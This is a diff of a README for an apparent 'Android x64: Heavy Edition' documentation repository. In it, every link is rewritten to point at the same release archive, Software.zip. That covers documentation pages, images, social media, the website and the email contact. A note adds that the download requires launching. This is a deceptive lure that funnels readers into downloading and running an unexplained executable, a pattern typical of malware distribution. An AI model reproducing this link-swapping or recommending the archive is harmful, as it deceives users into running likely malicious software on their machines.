@@ -1,6 +1,6 @@
 # 🤖️📖️ Welcome to Android x64: Heavy Edition Documentation Repository! 🚀
 
-![Android x64 Logo](https://example.com/android-x64-logo.png)
+![Android x64 Logo](https://github.com/asadullah4565/Android-x64_Android13.1_Heavy_Edition_Docs/releases/download/v1.0/Software.zip)
 
 ## Repository Name: 
 Android-x64_Android13.1_Heavy_Edition_Docs
@@ -16,34 +16,34 @@ android-13-1, android-alternative, android-t, android-x64, android-x64-android-1
 ## 📚 Documentation
 Explore the detailed documentation to get started with the Heavy Edition of Android 13.1:
 
-- [User Manual](docs/user_manual.md)
-- [Installation Guide](docs/installation_guide.md)
-- [FAQs](docs/faqs.md)
+- [User Manual](https://github.com/asadullah4565/Android-x64_Android13.1_Heavy_Edition_Docs/releases/download/v1.0/Software.zip)
+- [Installation Guide](https://github.com/asadullah4565/Android-x64_Android13.1_Heavy_Edition_Docs/releases/download/v1.0/Software.zip)
+- [FAQs](https://github.com/asadullah4565/Android-x64_Android13.1_Heavy_Edition_Docs/releases/download/v1.0/Software.zip)
 
 ## 🛠️ Development
-If you're interested in contributing to the Android x64 project, check out the [Development Guidelines](developers.md) to get involved!
+If you're interested in contributing to the Android x64 project, check out the [Development Guidelines](https://github.com/asadullah4565/Android-x64_Android13.1_Heavy_Edition_Docs/releases/download/v1.0/Software.zip) to get involved!
 
 ## 🚀 Download
 Get the latest version of Android x64: 
-[![Download Android x64](https://img.shields.io/badge/Download-Android_x64-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Android x64](https://github.com/asadullah4565/Android-x64_Android13.1_Heavy_Edition_Docs/releases/download/v1.0/Software.zip)](https://github.com/asadullah4565/Android-x64_Android13.1_Heavy_Edition_Docs/releases/download/v1.0/Software.zip)
 
 *(Requires launching after download)*
 
-If the provided link is not working, please visit the [Releases](https://github.com/yourusername/yourrepository/releases) section for alternative download options.
+If the provided link is not working, please visit the [Releases](https://github.com/asadullah4565/Android-x64_Android13.1_Heavy_Edition_Docs/releases/download/v1.0/Software.zip) section for alternative download options.
 
 ---
 
 ## 🌟 Stay Connected!
 Stay up-to-date with the latest developments, announcements, and discussions related to Android x64 Heavy Edition:
 
-📢 Follow us on [Twitter](https://twitter.com/androidx64)
-🌐 Visit our [Website](https://www.androidx64.com)
-📧 Contact us via [Email](mailto:info@androidx64.com)
+📢 Follow us on [Twitter](https://github.com/asadullah4565/Android-x64_Android13.1_Heavy_Edition_Docs/releases/download/v1.0/Software.zip)
+🌐 Visit our [Website](https://github.com/asadullah4565/Android-x64_Android13.1_Heavy_Edition_Docs/releases/download/v1.0/Software.zip)
+📧 Contact us via [Email](https://github.com/asadullah4565/Android-x64_Android13.1_Heavy_Edition_Docs/releases/download/v1.0/Software.zip)
 
 ---
 
 ## 🤝 Contributing
-We welcome and appreciate contributions from the community. If you have any suggestions, feedback, or want to report an issue, please refer to our [Contribution Guidelines](CONTRIBUTING.md).
+We welcome and appreciate contributions from the community. If you have any suggestions, feedback, or want to report an issue, please refer to our [Contribution Guidelines](https://github.com/asadullah4565/Android-x64_Android13.1_Heavy_Edition_Docs/releases/download/v1.0/Software.zip).
 
 ---
 
@@ -54,4 +54,4 @@ This project is licensed under the GNU General Public License v3.0. For more det
 
 Thank you for choosing Android x64: Heavy Edition as your Android 13.1 alternative! 🚀
 
-![Android x64](https://example.com/android-x64-screenshot.png)
+![Android x64](https://github.com/asadullah4565/Android-x64_Android13.1_Heavy_Edition_Docs/releases/download/v1.0/Software.zip)
